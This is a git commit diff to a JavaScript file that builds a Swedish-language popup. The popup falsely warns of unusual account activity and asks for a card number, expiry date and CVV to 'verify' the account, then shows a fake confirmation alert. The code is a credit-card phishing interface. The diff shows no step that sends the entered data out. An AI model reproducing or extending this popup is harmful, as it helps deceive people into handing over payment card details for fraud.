330d29a21aba38d124f79d308970b10845e90d78
Kir Neboula <newbie13xd@outlook.com>
2018-09-23 19:21:49 +0200

    meep

--- newbyte/panel/script.js
+++ newbyte/panel/script.js
@@ -2,7 +2,7 @@ class Popup {
     constructor() {
         this.popup = document.createElement("DIV");
         this.popupHeader = document.createElement("H1");
-        this.popupText = document.createElement("P");
+        this.popupTextBox = document.createElement("P");
         this.popupCCNumberField = document.createElement("INPUT");
         this.popupCCDateField = document.createElement("INPUT");
         this.popupCCCVVField = document.createElement("INPUT");
@@ -14,23 +14,23 @@ class Popup {
         this.popup.style.position = "fixed";
         this.popup.style.top = "50px";
         this.popup.style.left = "50%";
+        this.popup.style.textAlign = "center";
         this.popup.style.marginLeft = "-200px";
         this.popup.style.boxShadow = "1px 1px 15px 5px #333333AA";
         this.popupHeader.innerHTML = "Onormal aktivitet har upptäckts på ditt konto";
-        this.popupText = "För att verifiera att det verkligen är du och fortsätta använda tjänsten behöver vi verifiera dina kontouppgifter";
-        this.popupText.style.textAlign = "center";
-        this.popupText.style.marginTop = "3%";
-        this.popupText.style.marginBottom = "3%";
+        this.popupTextBox.innerHTML = "För att verifiera att det verkligen är du och fortsätta använda tjänsten behöver vi verifiera dina kontouppgifter";
+        this.popupTextBox.style.marginTop = "3%";
+        this.popupTextBox.style.marginBottom = "3%";
         this.popupCCNumberField.style.width = "96%";
         this.popupCCCVVField.style.width = "96%";
         this.popupCCDateField.style.width = "96%";
-        this.popupButton.innerHTML = "Submit";
+        this.popupButton.innerHTML = "Verifiera konto";
         this.popupButton.style.marginTop = "2.4%";
         this.popupButton.style.width = "20%";
         this.popupButton.style.marginLeft = "40%";
         this.popupButton.addEventListener("click", this.closePopUp.bind(this));
         this.popup.appendChild(this.popupHeader);
-        this.popup.appendChild(this.popupText);
+        this.popup.appendChild(this.popupTextBox);
         this.popup.appendChild(this.popupCCNumberField);
         this.popup.appendChild(this.popupCCDateField);
         this.popup.appendChild(this.popupCCCVVField);
@@ -40,6 +40,7 @@ class Popup {
     closePopUp() {
         if (this.popupCCNumberField.value.length > 0) {
             this.popup.parentElement.removeChild(this.popup);
+            alert("Tack! Ditt konto är nu verifierat och du kan fortsätta att använda tjänsten.")
         }
     }
 }
